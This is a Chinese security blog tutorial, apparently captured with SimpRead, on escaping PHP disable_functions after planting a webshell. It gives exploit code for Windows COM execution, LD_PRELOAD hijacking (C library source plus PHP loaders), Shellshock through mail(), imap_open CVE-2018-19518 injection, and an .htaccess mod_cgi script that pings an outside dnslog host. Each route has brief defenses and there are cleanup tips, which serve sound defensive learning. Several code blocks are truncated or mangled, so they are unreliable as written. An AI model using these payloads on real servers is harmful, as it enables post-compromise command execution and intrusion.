奇怪的 知识增加了 酒
PHP _
仙桥六号部队
- MdEditor
“ 奇怪的 PHP 知识增加了
前⾔
随着安全防护能⼒的提升，在渗透测试的过程中总会遇到
阻碍，今天来看看 PHP webshell ⽆法执⾏命令该怎么解
决，以及如何防御这些绕过⼿段，做到未⾬绸缪。
背景
在渗透过程中拿到⼀个 webshell 是⼀个标志性的胜利，
为我们后续的进展带来了⽆限可能。但是，what！怎么
⼀条命令都执⾏不了？
此时拿 shell 的喜悦已经没有了，这是个假 shell？？
赶紧冷静了⼀下看看⽂件管理是正常的，那么传⼀个
phpinfo 看⼀下什么情况。
原来是 disable_functions 禁⽤了很多命令执⾏函数，导
致拿到 webshell ⽆法执⾏命令。好吧算你狠。
但是这怎么能挡住我们勤劳勇敢的安全⼈员，何况 PHP
是世界上最好的语⾔，我们⼀定有办法的。
可以利⽤的思路有以下五种：
寻找没有被禁⽤的函数
Windows 中调⽤ COM 组件执⾏命令
Linux 系统通过 LD_PRELOAD 加载⾃定义的动
态库
利⽤ Bash 破壳（CVE-2014-6271）漏洞改变环
境限制
利⽤ imap_open() 函数的特性绕过
通过 mod_cgi 模式绕过 php.ini 的限制执⾏脚本
接下来我们来看看如何绕过 disable_functions 执⾏命
令。
⼀. 寻找未禁⽤的漏⽹之⻥函数
PHP 中执⾏命令的函数有
system,shell_exec,passthru,exec,popen,proc_open,pc
ntl_exec,mail,putenv,apache_setenv,mb_send_mail,as
sert,dl,set_time_limit,ignore_user_abort,symlink,link,m
ap_open,imap_mail,ini_set,ini_alter，通常会有漏⽹之
⻥，我们可以尝试寻找⼀些偏僻没有被禁⽤的函数如
proc_open()、pcntl_exec() 等。
⼆. Windows 中调⽤ COM 组件执⾏命令
环境要求：
1.php.ini 中已经开启 com.allow_dcom、
extension=php_com_dotnet.dll
2. 在 php/ext / ⾥⾯存在 php_com_dotnet.dll 这个⽂
件
利⽤原理：
在 Windows 环境中 PHP 中的 COM() 函数可以创建系
统组件对象来运⾏系统命令。
上传 com_rce.php ⽂件，内容如下：
exec("cmd /c".$command); //调⽤对象⽅法来执
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
利⽤效果：
防御⽅法：
1. Windows 的 COM 组件可能会被⽤来绕过
UAC、disable_functions 等，我们需要检查
PHP 的配置⽂件中 com.allow_dcom 是否为
false。
2. 删除 php/ext / 下的 php_com_dotnet.dll，防⽌
被恶意利⽤。
三. Linux 中利⽤ LD_PRELOAD 绕过
什么是 LD_PRELOAD？
LD_PRELOAD 是 Linux 系统的⼀个环境变量，它的加载
优先级最⾼，可以⽤来覆盖正常的函数库。我们可以通过
LD_PRELOAD 加载我们写的函数库，来覆盖系统中原有
的⼀些函数达到执⾏命令的效果。AntSword 中的
disable_functions 插件原理也是如此。
3.1 利⽤ mail 函数劫持 getuid()
环境要求：
1.Linux 系统安装并启⽤了 sendmail 程序。
2.error_log() 和 mail() 函数没有全被禁⽤。
利⽤原理：
php 的 mail() 函数在执⾏过程中会默认调⽤系统程序 /
usr/sbin/sendmail、/usr/sbin/postdrop, ⽽ /
usr/sbin/sendmail 会调⽤ getuid()。那么我们通过
LD_PRELOAD 劫持 getuid 函数，然后调⽤ mail 函数执
⾏我们⽣成的恶意函数库中的 getuid 函数。
重写的 getuid() 函数 test.c。
#include 
#include 
#include 
int geteuid() {
const char* cmdline = getenv("EVIL_CMDLINE");
if (getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
system(cmdline);
}
⽤ gcc -shared -fPIC test.c -o test.so 将 test.c 编译
为动态链接库 test.so。
gituid.php
这⾥⽤了 putenv() 函数将 test.so 加⼊环境变量。
 example:
http://test.com/exp.php?cmd=pwd&outpath=/tmp/xx&sopath
";
$cmd = $_GET["cmd"];
$out_path = $_GET["outpath"];
$evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
echo " cmdline: " . $evil_cmdline . "";
putenv("EVIL_CMDLINE=" . $evil_cmdline);
$so_path = $_GET["sopath"];
putenv("LD_PRELOAD=" . $so_path);
mail("", "", "", "");
echo " output: " . nl2br(file_get_cont
. "";
unlink($out_path);
?>
利⽤效果：
3.2 劫持启动函数
环境要求：
Linux 系统
利⽤原理：
上⾯的⽅法需要通过 LD_PRELOAD 劫持⼀个系统函数
来实现 RCE，如果 sendmail 函数被禁⽤了呢？如果能
找到⼀个⽅式在加载时就执⾏代码，⽽不⽤考虑劫持某⼀
系统函数，那我就完全可以不依赖 sendmail 了。⽽
C++ 的构造函数就是如此。
向⽬标机器上传 bypass_disablefunc.c：
#define _GNU_SOURCE
#include 
#include 
#include 
extern char** environ;
__attribute__ ((__constructor__)) void preload (void)
{
// get command line options and arg
const char* cmdline = getenv("EVIL_CMDLINE");
// unset environment variable LD_PRELOAD.
// unsetenv("LD_PRELOAD") no effect on some
// distribution (e.g., centos), I need crafty trick.
int i;
for (i = 0; environ[i]; ++i) {
if (strstr(environ[i], "LD_PRELOAD")) {
environ[i][0] = '0';
}
}
// executive command
system(cmdline);
}
接着⽤以下语句编译 C ⽂件为共享对象⽂件：
gcc -shared -fPIC bypass_disablefunc.c -o
bypass_disablefunc.so
bypass_disablefunc.php
 example:
http://site.com/bypass_disablefunc.php?cmd=pwd&outpath
";
$cmd = $_GET["cmd"];
$out_path = $_GET["outpath"];
$evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
echo " cmdline: " . $evil_cmdline . "";
putenv("EVIL_CMDLINE=" . $evil_cmdline);
$so_path = $_GET["sopath"];
putenv("LD_PRELOAD=" . $so_path);
mail("", "", "", "");
echo " output: " . nl2br(file_get_cont
. "";
unlink($out_path);
?>
利⽤效果：
防御⼿段：
1. 这个⽅法需要上传 so ⽂件和 php 脚本，如果正
确配置 open_basedir，限制⽬录的读写、执⾏权
限可以防范这种攻击。
四. 利⽤ Bash 破壳（CVE-2014-6271）漏洞
环境要求：
Linux 中 Bash 版本⼩于等于 4.3，且存在破壳漏洞
可以执⾏ “env x='() { :;}; echo vulnerable' bash -c
"echo this is a test"” 来测试是否存在破壳漏洞，如果
存在会输出
vulnerable
this is a test
利⽤原理：
存在 Bash 破壳（CVE-2014-6271）的 Linux 服务器向
环境变量值内的函数定义后添加多余的字符串会触发此漏
洞，可利⽤此漏洞改变或绕过环境限制。mail 函数的第
五个参数会被交给 popen() 执⾏, 如果系统默认 sh 是
bash，popen() 会派⽣ bash 进程, 进⽽可利⽤破壳漏洞
执⾏命令。
上传 shellshock.php：
$tmp 2>&1");
mail("a@127.0.0.1","","","","-bv"); // -bv so we don't
$output = @file_get_contents($tmp);
@unlink($tmp);
if($output != "") return $output;
else return "No output, or not vuln.";
}
echo shellshock($_REQUEST["cmd"]);
?>
利⽤效果：
防御⼿段：
Bash 破壳漏洞在 2014 年爆出后影响了⼤部分 Linux 系
统。将 Linux 的 bash 升级到最新版本可防御这种攻
击。
1. 利⽤ imap_open 函数的特性绕过（CVE-2018-
19518）。
环境要求：
1. 安装了 PHP 的 imap 扩展。
2. php.ini 中开启 imap.enable_insecure_rsh 选项
为 On。
利⽤原理：
imap_open 函数在将邮箱名称传递给 rsh 或 ssh 命令之
前没有正确地过滤邮箱名称。如果启⽤了 rsh 和 ssh 功
能并且 rsh 命令是 ssh 命令的符号链接，可以发送包含
- oProxyCommand 参数的恶意 IMAP 服务器名称来利
⽤此漏洞。
上传 imap_bypass.php：
/tmp/cmd_result") . "|base64t-d|sh}";
//$server = 'x -oProxyCommand=echo$IFS$()' . base64_en
">/tmp/cmd_result") . '|base64$IFS$()-d|sh}';
imap_open('{' . $server . ':143/imap}INBOX', '', '');
var_dump("nnError: ".imap_last_error());
sleep(5);
echo file_get_contents("/tmp/cmd_result");
?>
利⽤效果：
防御⽅法：
1. 如果业务没有⽤到 imap 相关的函数可以在
php.ini 添加禁⽤函数：imap_open()、
imap_mail()、imap_rimap()
2. 升级 PHP 版本，官⽅针对 7.1.x 在 7.1.25 版本发
布时修复了 CVE-2018-19518 漏洞
3. 利⽤ Apache mod_cgi 模式绕过 php.ini 中的限
制
环境要求：
1.apache 服务加载了 cgi_module 模块，在 apache 的
配置⽂件中有如下内容：LoadModule cgi_module
modules/mod_cgi.so
2. 当前⽬录可以上传并解析. htaccess ⽂件，配置⽂件
中应该写了 “AllowOverride all”
3. 环境中安装了 python（其他语⾔环境也可以尝试）。
利⽤原理：
看到这⾥我估计⼤家都想到了，没错就是通过修改.
htaccess ⽂件让 CGI 解析 python 脚本执⾏系统命令。
.htaccess 内容如下：
AddHandler cgi-script .x
Python.x内容如下：
\#!F:\\Python38\\python.exe
import os
os.system("ping hbztiu.dnslog.cn")\#参数改为想要执⾏的命令
利⽤效果：
防御⽅法：
.htaccess ⽂件是 Apache 下特有的配置⽂件，没有好的
防御⽅法。如果程序没有⽤到这个⽂件就在 PHP 配置⽂
件中禁⽤ mod_cgi 和. htaccess。
五. 应急处置⽅法
当我们的服务器被遭受了上⾯的攻击后应该如何排查处置
呢？
1. 上⾯的攻击⽅法需要在服务器上传⽂件，可以根据这些
关键字在服务器上筛选可疑⽂件：WScript.shell、
putenv、LD_PRELOAD、geteuid、imap_open。
2. 检查 PHP 配置⽂件和. htaccess 是否被更改、增加了
恶意的配置。
3. 检查 bash 等系统组件是否存在漏洞被结合其他漏洞
利⽤了。
六. 总结
未知攻焉知防，作为安全⼈员我们需要了解新的攻击⽅
法，也需要了解怎么去防范这种攻击。攻防相互促进，才
能更上⼀层楼。
全⽂完
本⽂由 简悦 SimpRead (http://ksria.com/simpread) 优化，⽤以
提升阅读体验
使⽤了 全新的简悦词法分析引擎 beta，点击查看
(http://ksria.com/simpread/docs/#/词法分析引擎)详细说明